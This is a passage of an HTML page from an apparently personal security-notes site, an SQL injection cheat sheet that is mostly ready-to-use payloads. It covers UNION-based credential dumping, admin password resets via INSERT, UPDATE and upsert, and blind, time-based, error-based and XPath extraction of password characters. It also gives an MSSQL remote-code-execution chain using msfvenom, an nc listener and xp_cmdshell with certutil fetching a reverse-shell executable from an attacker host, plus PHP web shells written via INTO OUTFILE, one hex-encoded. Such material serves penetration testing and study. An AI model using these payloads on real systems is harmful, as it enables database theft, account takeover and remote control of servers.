+</span><span id="__span-23-11"><a id="__codelineno-23-11" name="__codelineno-23-11" href="#__codelineno-23-11"></a>&#39; UNION SELECT username,password FROM users WHERE username=&#39;admin&#39; AND password=&#39;password1&#39;-- -
+</span><span id="__span-23-12"><a id="__codelineno-23-12" name="__codelineno-23-12" href="#__codelineno-23-12"></a>
+</span><span id="__span-23-13"><a id="__codelineno-23-13" name="__codelineno-23-13" href="#__codelineno-23-13"></a>&#39; UNION SELECT username,password FROM users WHERE username=&#39;admin&#39; OR password=&#39;password1&#39;--
+</span><span id="__span-23-14"><a id="__codelineno-23-14" name="__codelineno-23-14" href="#__codelineno-23-14"></a>&#39; UNION SELECT username,password FROM users WHERE username=&#39;admin&#39; OR password=&#39;password1&#39;-- -
+</span><span id="__span-23-15"><a id="__codelineno-23-15" name="__codelineno-23-15" href="#__codelineno-23-15"></a>
+</span><span id="__span-23-16"><a id="__codelineno-23-16" name="__codelineno-23-16" href="#__codelineno-23-16"></a>&#39; UNION SELECT username,password FROM users WHERE username=&#39;admin&#39; AND password LIKE &#39;pas%&#39;--
+</span><span id="__span-23-17"><a id="__codelineno-23-17" name="__codelineno-23-17" href="#__codelineno-23-17"></a>&#39; UNION SELECT username,password FROM users WHERE username=&#39;admin&#39; AND password LIKE &#39;pas%&#39;-- -
+</span></code></pre></div>
+<p><strong>BINARY</strong>: Sensitive to upper case and lower case.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>&#39; UNION SELECT username,password FROM users WHERE username=&#39;admin&#39; AND BINARY password=&#39;PassWord&#39;--
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>&#39; UNION SELECT username,password FROM users WHERE username=&#39;admin&#39; AND BINARY password=&#39;PassWord&#39;-- -
+</span></code></pre></div>
+<h3 id="dumping-table">Dumping Table</h3>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>&#39; UNION SELECT table_name FROM table_name--
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>&#39; UNION SELECT table_name,NULL FROM table_name--
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="fetch-all-entities">Fetch All Entities</h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>&#39; UNION SELECT * FROM users-- -
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>&#39;; SELECT * FROM users-- -
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="modifyinsert-data">Modify/Insert Data</h2>
+<h3 id="insert-arbitrary-data">Insert Arbitrary Data</h3>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>&#39; INSERT INTO users (username, password) VALUES (&#39;admin&#39;, &#39;pass&#39;)-- -
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>&#39;; INSERT INTO users (username, password) VALUES (&#39;admin&#39;, &#39;pass&#39;)-- -
+</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>
+</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="cm">&lt;!-- Insert a payload --&gt;</span>
+</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a>&#39; INSERT INTO products (id, name, price) VALUES (999, &quot;<span class="cp">&lt;?php system(&#39;id&#39;); ?&gt;</span>&quot;, 10)-- - 
+</span></code></pre></div>
+<h3 id="update-arbitrary-data">Update Arbitrary Data</h3>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>&#39; UPDATE users SET password=&#39;password123&#39; WHERE username=&#39;admin&#39;-- -
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>&#39; UPDATE users SET password=&#39;password123&#39; WHERE id=1-- -
+</span></code></pre></div>
+<h3 id="upsert">Upsert</h3>
+<p>This is a combination of <strong><code>UPDATE</code></strong> and <strong><code>INSERT</code></strong> operation. If a particular row already exists, it will be updated with new values. Here are examples that update password for the existing <strong><code>admin</code></strong> user.</p>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="cm">&lt;!-- MySQL --&gt;</span>
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>INSERT INTO users (username, password) VALUES(&#39;admin&#39;, &#39;&#39;) ON DUPLICATE KEY UPDATE password=&#39;&#39;-- -
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>
+</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a><span class="cm">&lt;!-- PostgreSQL, SQLite --&gt;</span>
+</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a>INSERT INTO users (username, password) VALUES (&#39;admin&#39;, &#39;&#39;) ON CONFLICT (username) DO UPDATE SET password=&#39;password&#39;--
+</span></code></pre></div>
+<h2 id="rce">RCE</h2>
+<h3 id="mssql_3">MSSQL</h3>
+<ol>
+<li>In attack machine, prepare a payload for reverse shell.</li>
+</ol>
+<p>Replace the ip address of <code>LHOST</code> with your ip.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe
+</span></code></pre></div>
+<ol>
+<li>In attack machine, start a local web server to host the payload file.</li>
+</ol>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>python3 -m http.server 8000
+</span></code></pre></div>
+<ol>
+<li>In attack machine, start a listener to receiver incoming connection.</li>
+</ol>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>nc -lvnp 4444
+</span></code></pre></div>
+<ol>
+<li>In target website, execute the shell command with SQLi.</li>
+</ol>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="cm">&lt;!-- 1. Enable the shell command --&gt;</span>
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>&#39; ; EXEC sp_configure &#39;show advanced options&#39;, 1; RECONFIGURE; EXEC sp_configure &#39;xp_cmdshell&#39;, 1; RECONFIGURE;--
+</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>
+</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a><span class="cm">&lt;!-- 2. Download our payload --&gt;</span>
+</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a>&#39; ; EXEC xp_cmdshell &#39;certutil -urlcache -f http://10.0.0.1:8000/shell.exe C:\Windows\Temp\shell.exe&#39;;--
+</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a>
+</span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a><span class="cm">&lt;!-- 3. Execute the payload --&gt;</span>
+</span><span id="__span-33-8"><a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a>&#39; ; EXEC xp_cmdshell &#39;C:\Windows\Temp\shell.exe&#39;;--
+</span></code></pre></div>
+<p>After execution, we may get a shell of target system.</p>
+<p><br /></p>
+<h2 id="error-based-sqli">Error-based SQLi</h2>
+<p>Reference: <a href="https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based">https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based</a></p>
+<p>We might be able to gather information of the database by leading the error message. We can construct SQLi while checking error messages.<br />
+Here are MySQL injection examples.</p>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>&#39; AND 1=CAST((SELECT 1) AS int)-- -
+</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>&#39; AND 1=CAST((SELECT password FROM users) AS int)-- -
+</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a><span class="cm">&lt;!-- Limit only one row if required --&gt;</span>
+</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a>&#39; AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)
+</span></code></pre></div>
+<p>In the example above, we may see the password revealed in the error message.</p>
+<p><br /></p>
+<h2 id="blind-sql">Blind SQL</h2>
+<h3 id="1-check-if-the-sql-injection-works">1. Check if the SQL Injection Works</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>&#39; AND &#39;1&#39;=&#39;1
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>&#39; AND &#39;1&#39;=&#39;2
+</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>&#39; AND (SELECT &#39;a&#39; FROM users LIMIT 1)=&#39;a
+</span></code></pre></div>
+<h3 id="2-check-if-content-value-exists">2. Check if Content Value Exists</h3>
+<p>For example, check if username 'administrator' exists in 'users'</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>&#39; AND (SELECT &#39;a&#39; FROM users WHERE username=&#39;administrator&#39;)=&#39;a
+</span></code></pre></div>
+<p>If so, determine the password length</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>&#39; AND (SELECT &#39;a&#39; FROM users WHERE username=&#39;administrator&#39; AND LENGTH(password)&gt;1)=&#39;a
+</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>&#39; AND (SELECT &#39;a&#39; FROM users WHERE username=&#39;administrator&#39; AND LENGTH(password)&gt;2)=&#39;a
+</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a>...
+</span><span id="__span-37-4"><a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a>&#39; AND (SELECT &#39;a&#39; FROM users WHERE username=&#39;administrator&#39; AND LENGTH(password)=8)=&#39;a
+</span></code></pre></div>
+<p>Brute force password's character</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>&#39; AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username=&#39;administrator&#39;)=&#39;$a$
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>&#39; AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username=&#39;administrator&#39;)=&#39;$a$
+</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>...
+</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a>&#39; AND (SELECT SUBSTRING(password,8,1) FROM users WHERE username=&#39;administrator&#39;)=&#39;$a$
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="blind-sql-time-based">Blind SQL (Time-based)</h2>
+<h3 id="1-first-check">1. First Check</h3>
+<ul>
+<li><strong>MySQL</strong></li>
+</ul>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>    &#39; AND sleep(5)-- -
+</span></code></pre></div>
+<ul>
+<li><strong>PostgreSQL</strong></li>
+</ul>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>    &#39;||pg_sleep(10)--
+</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>    &#39;; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
+</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a>    &#39;; SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
+</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a>
+</span><span id="__span-40-5"><a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a>    <span class="cm">&lt;!--- https://hackerone.com/reports/2209130 --&gt;</span>
+</span><span id="__span-40-6"><a id="__codelineno-40-6" name="__codelineno-40-6" href="#__codelineno-40-6"></a>    &#39;);(SELECT 1234 FROM PG_SLEEP(10))--
+</span></code></pre></div>
+<h3 id="2-check-if-content-value-exists_1">2. Check if Content Value Exists</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>&#39;; SELECT CASE WHEN (username=&#39;administrator&#39;) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+</span></code></pre></div>
+<p>If so, determine the password length</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>&#39;; SELECT CASE WHEN (username=&#39;administrator&#39; AND LENGTH(password)&gt;1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>&#39;; SELECT CASE WHEN (username=&#39;administrator&#39; AND LENGTH(password)&gt;2) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>...
+</span><span id="__span-42-4"><a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a>&#39;; SELECT CASE WHEN (username=&#39;administrator&#39; AND LENGTH(password)=8) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+</span></code></pre></div>
+<p>Brute force password character</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>&#39;; SELECT CASE WHEN (username=&#39;administrator&#39; AND SUBSTRING(password,1,1)=&#39;$a$&#39;) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>&#39;; SELECT CASE WHEN (username=&#39;administrator&#39; AND SUBSTRING(password,2,1)=&#39;$a$&#39;) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>...
+</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a>&#39;; SELECT CASE WHEN (username=&#39;administrator&#39; AND SUBSTRING(password,8,1)=&#39;$a$&#39;) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="conditional-error">Conditional Error</h2>
+<h3 id="1-first-check_1">1. First Check</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>&#39;
+</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a>&#39;&#39;
+</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a>&#39;||(SELECT &#39;&#39;)||&#39;
+</span><span id="__span-44-4"><a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a>&#39;||(SELECT &#39;&#39; FROM dual)||&#39;
+</span><span id="__span-44-5"><a id="__codelineno-44-5" name="__codelineno-44-5" href="#__codelineno-44-5"></a>&#39;||(SELECT &#39;&#39; FROM fake_table)||&#39;
+</span><span id="__span-44-6"><a id="__codelineno-44-6" name="__codelineno-44-6" href="#__codelineno-44-6"></a>&#39;||(SELECT &#39;&#39; FROM users WHERE ROWNUM = 1||&#39;
+</span><span id="__span-44-7"><a id="__codelineno-44-7" name="__codelineno-44-7" href="#__codelineno-44-7"></a>&#39;|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE &#39;&#39; END FROM dual)||&#39;
+</span><span id="__span-44-8"><a id="__codelineno-44-8" name="__codelineno-44-8" href="#__codelineno-44-8"></a>&#39;|| (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE &#39;&#39; END FROM dual)||&#39;
+</span></code></pre></div>
+<h3 id="2-check-if-content-value-exists_2">2. Check if Content Value Exists</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>&#39;|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE &#39;&#39; END FROM users WHERE username=&#39;administrator&#39;)||&#39;
+</span></code></pre></div>
+<p>If so, determine the password length</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>&#39;&#39;||(SELECT CASE WHEN LENGTH(password)&gt;2 THEN TO_CHAR(1/0) ELSE &#39;&#39; END FROM users WHERE username=&#39;administrator&#39;)||&#39;
+</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a>&#39;&#39;||(SELECT CASE WHEN LENGTH(password)&gt;3 THEN TO_CHAR(1/0) ELSE &#39;&#39; END FROM users WHERE username=&#39;administrator&#39;)||&#39;
+</span><span id="__span-46-3"><a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a>...
+</span><span id="__span-46-4"><a id="__codelineno-46-4" name="__codelineno-46-4" href="#__codelineno-46-4"></a>&#39;&#39;||(SELECT CASE WHEN LENGTH(password)=8 THEN TO_CHAR(1/0) ELSE &#39;&#39; END FROM users WHERE username=&#39;administrator&#39;)||&#39;
+</span></code></pre></div>
+<p>Brute force password character</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>&#39;||(SELECT CASE WHEN SUBSTR(password,1,1)=&#39;§a§&#39; THEN TO_CHAR(1/0) ELSE &#39;&#39; END FROM users WHERE username=&#39;administrator&#39;)||&#39;
+</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>&#39;||(SELECT CASE WHEN SUBSTR(password,2,1)=&#39;§a§&#39; THEN TO_CHAR(1/0) ELSE &#39;&#39; END FROM users WHERE username=&#39;administrator&#39;)||&#39;
+</span><span id="__span-47-3"><a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a>...
+</span><span id="__span-47-4"><a id="__codelineno-47-4" name="__codelineno-47-4" href="#__codelineno-47-4"></a>&#39;||(SELECT CASE WHEN SUBSTR(password,8,1)=&#39;§a§&#39; THEN TO_CHAR(1/0) ELSE &#39;&#39; END FROM users WHERE username=&#39;administrator&#39;)||&#39;
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="writing-files">Writing Files</h2>
+<p>We can write arbitary code to a file as below.</p>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>&#39; SELECT &#39;<span class="cp">&lt;?php echo system(&quot;id&quot;);?&gt;</span>&#39; INTO OUTFILE &#39;/var/www/html/shell.php&#39;-- -
+</span></code></pre></div>
+<h3 id="hex-encoded-payloads">HEX Encoded Payloads</h3>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>&#39; INTO OUTFILE &#39;/var/www/html/shell.php&#39; LINES TERMINATED by 0x3C3F7068702073797374656D28245F4745545B22636D64225D29203F3E-- -
+</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a>&#39; INTO OUTFILE &#39;/var/www/html/shell.php&#39; LINES TERMINATED by 0x3C3F7068702073797374656D28245F4745545B22636D64225D29203F3E#
+</span></code></pre></div>
+<p><strong>'0x3C3F...'</strong> is a hex encoded text meaning <strong>"\&lt;?php system($_GET["cmd"]) ?&gt;"</strong>. After injectin, we can access to <strong><code>http://10.0.0.1/shell.php?cmd=whoami</code></strong>.</p>
+<p><br /></p>
+<h2 id="xml-filter-bypass">XML Filter Bypass</h2>
+<p>Reference: <a href="https://portswigger.net/web-security/sql-injection">https://portswigger.net/web-security/sql-injection</a></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>&lt;storeId&gt;
+</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a>    &lt;!-- Convert &#39;S&#39; to HTML entity --&gt;
+</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a>    1 &amp;#x53;ELECT * FROM information_schema.tables
+</span><span id="__span-50-4"><a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a>&lt;/storeId&gt;
+</span></code></pre></div>
+<p>If you use <strong>Burp Suite</strong>, it’s recommended to use the <strong>Hackvertor</strong> extention to obfuscate payloads.<br />
+For example, in <strong>Repeater</strong>, highlight the string which you want to encode. Then right-click and select <strong>Extensions → Hackvertor → Encode → hex_entities</strong>.<br />
+After that, our payload is as below.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>&lt;storeId&gt;
+</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a>    &lt;@hex_entities&gt;
+</span><span id="__span-51-3"><a id="__codelineno-51-3" name="__codelineno-51-3" href="#__codelineno-51-3"></a>        1 UNION SELECT * FROM information_schema.tables
+</span><span id="__span-51-4"><a id="__codelineno-51-4" name="__codelineno-51-4" href="#__codelineno-51-4"></a>    &lt;@/hex_entities&gt;
+</span><span id="__span-51-5"><a id="__codelineno-51-5" name="__codelineno-51-5" href="#__codelineno-51-5"></a>&lt;/storeId&gt;
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="xpath-injection">XPATH Injection</h2>
+<h3 id="mysql_3">MySQL</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>&#39; AND UPDATEXML(NULL,CONCAT(0x3a,(SELECT SUBSTRING(password,1,16) FROM users)),null)-- -
+</span></code></pre></div>
+<p>If the error result appears such like the following, we retrieved the piece of the password hash.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>XPATH syntax error: &#39;:3ac6b24dc611a692&#39;
+</span></code></pre></div>
+<p>So we can find the remaining of the password hash by injecting below command.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>&#39; AND UPDATEXML(NULL,CONCAT(0x3a,(SELECT SUBSTRING(password,17,32) FROM users)),null)-- -
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="truncation-attack">Truncation Attack</h2>
+<p>We can add another user which is the same name as the existing user by registering the same name user with enough “spaces” to truncate a username.<br />
+First off, check the table schema if can.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>CREATE TABLE `users` (
+</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a>  `username` varchar(64) DEFAULT NULL,
+</span><span id="__span-55-3"><a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a>  `password` varchar(64) DEFAULT NULL
+</span><span id="__span-55-4"><a id="__codelineno-55-4" name="__codelineno-55-4" href="#__codelineno-55-4"></a>);
+</span></code></pre></div>
+<p>Now send POST request with a payload to create a new admin.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a># POST request
+</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a>POST /create-user HTTP/1.1
+</span><span id="__span-56-3"><a id="__codelineno-56-3" name="__codelineno-56-3" href="#__codelineno-56-3"></a>
+</span><span id="__span-56-4"><a id="__codelineno-56-4" name="__codelineno-56-4" href="#__codelineno-56-4"></a># Create another new &quot;admin&quot; with more than 64 characters. Btw, &quot;+&quot; means the spaces.
+</span><span id="__span-56-5"><a id="__codelineno-56-5" name="__codelineno-56-5" href="#__codelineno-56-5"></a>username=admin+++++++++++++++++++++++++++++++++++++++++++++++++++++++++random&amp;password=password
+</span></code></pre></div>
+<p>Then check if we can login with a new admin.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>username=admin&amp;password=password
+</span></code></pre></div>
+<p>Fetch the admin's information with the original password.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>SELECT * FROM users WHERE username=&#39;admin&#39;;
+</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a>
+</span><span id="__span-58-3"><a id="__codelineno-58-3" name="__codelineno-58-3" href="#__codelineno-58-3"></a># It should return the values are the real admin&#39;s information.
+</span><span id="__span-58-4"><a id="__codelineno-58-4" name="__codelineno-58-4" href="#__codelineno-58-4"></a>username = admin
+</span><span id="__span-58-5"><a id="__codelineno-58-5" name="__codelineno-58-5" href="#__codelineno-58-5"></a>password = &lt;REAL_ADMIN_PASSWORD&gt;
+</span></code></pre></div>
+
+  <br>
+    
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/web/security-risk/sql-injection-cheat-sheet.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
+</footer>
+
+</body>
+</html>
